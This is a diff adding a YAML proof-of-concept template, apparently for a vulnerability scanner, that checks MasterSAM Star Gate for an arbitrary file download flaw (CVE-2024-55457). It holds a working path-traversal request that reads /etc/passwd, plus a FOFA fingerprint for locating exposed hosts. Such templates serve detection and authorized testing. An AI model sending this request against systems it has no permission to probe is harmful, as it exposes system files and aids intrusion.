@@ -1,0 +1,16 @@
+id: poc-yaml-mastersam-star-gate-downloadservice-anyfile-download
+info:
+  name: MasterSAM Star Gate downloadService 任意文件下载漏洞(CVE-2024-55457)
+  severity: high
+  tags:
+  - 文件读取
+  - CVE-2024-55457
+  finger: mastersam-star-gate
+  fofa: icon_hash="-2145752394"
+requests:
+- method: GET
+  path: /adama/adama/downloadService?type=1&file=../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"filename=\"passwd\"") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
